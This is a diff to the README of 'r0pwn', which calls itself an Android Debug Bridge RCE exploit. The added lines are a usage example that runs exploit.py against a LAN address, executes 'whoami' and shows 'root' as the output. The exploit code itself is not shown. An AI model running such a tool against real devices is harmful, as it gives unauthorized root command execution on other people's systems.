@@ -44,6 +44,22 @@ root@nevada:~#
 root@kali:~/r0pwn# python3 exploit.py <target> -s <code>
 ```
 
+**NOTE:** Angry substitution will not work without SUID/root!
+
+```shell
+root@kali:~/r0pwn# python3 exploit.py 192.168.1.75 -s whoami
+
+======================
+r0pwn by Ivan Nikolsky
+======================
+
+Android Debug Bridge RCE exploit.
+
+exploiting 192.168.1.75...
+substituting whoami...
+root
+```
+
 # Algorithm
 
 ```
